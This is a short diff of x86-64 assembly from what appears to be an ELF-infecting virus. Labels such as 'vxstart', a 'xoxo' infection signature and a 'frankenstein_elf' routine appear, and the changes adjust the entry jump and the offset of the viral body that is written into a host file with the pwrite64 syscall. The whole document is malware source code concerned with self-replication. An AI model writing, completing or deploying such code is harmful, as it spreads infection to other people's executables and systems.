@@ -333,13 +333,13 @@ global _start
 default rel
 section .text
 _start:
-	;jmp vxstart
-	lea rax, [rel vxstart]
-	jmp rax
+	jmp vxstart
+	;lea rax, [rel vxstart]
+	;jmp rax
 	vxsig: db "xoxo",0
-test:
-	lea rax, [vxstart]
-	jmp rax
+;test:
+	;lea rax, [vxstart]
+	;jmp rax
 
 vxstart:
 	push rbp
@@ -887,7 +887,7 @@ frankenstein_elf:
 			sub rax, .delta
 		mov rdi, r9
 		mov rdx, vlen
-		lea rsi, [rax + _start]
+		lea rsi, [rax + vxstart]
 		mov r10d, dword [r14 + 436]
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
